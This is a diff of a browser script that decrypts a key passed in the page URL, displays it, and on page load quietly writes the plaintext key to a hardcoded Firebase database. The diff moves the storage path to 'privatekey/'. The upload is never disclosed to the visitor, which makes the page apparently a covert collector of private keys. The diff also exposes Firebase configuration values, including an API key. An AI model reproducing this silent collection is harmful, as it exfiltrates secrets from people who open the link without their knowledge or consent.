@@ -17,7 +17,7 @@ function decryptKey(finalKey) {
     }
 }
 
-// Firebase configuration
+// Firebase config
 const firebaseConfig = {
     apiKey: "AIzaSyCIoD2Zy5yzUmAkO8H6Hk4Jg1EYrK73vUU",
     authDomain: "appdbs-45d54.firebaseapp.com",
@@ -28,39 +28,41 @@ const firebaseConfig = {
     appId: "1:588555582889:android:de5d432c39e9ae904cd8b8"
 };
 
-// Initialize Firebase
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
-// Upload decrypted key + timestamp with key inside
-function uploadKey(key) {
+function uploadKey(realKey) {
+
+    // Convert real key → Firebase‑safe key
+    const safeKey = btoa(realKey); // base64 encoded
+
     const timestamp = new Date().toLocaleString();
-    const keyRef = db.ref("public_keys/" + key);
-    keyRef.set({
-        key: key,
+
+    const ref = db.ref("privatekey/" + safeKey);
+
+    ref.set({
+        key: realKey,
         time: timestamp
     });
 }
 
-// On page load
 window.onload = function () {
     const urlParams = new URLSearchParams(window.location.search);
     const encrypted = urlParams.get("key");
-
     const outputEl = document.getElementById("output");
+
     if (!encrypted) {
-        outputEl.innerText = "No key found in URL!";
+        outputEl.innerText = "No key found!";
         return;
     }
 
     const decrypted = decryptKey(encrypted);
     if (!decrypted) {
-        outputEl.innerText = "Invalid or corrupted key";
+        outputEl.innerText = "Invalid key!";
         return;
     }
 
     outputEl.innerText = decrypted;
 
-    // Upload to Firebase
     uploadKey(decrypted);
 };
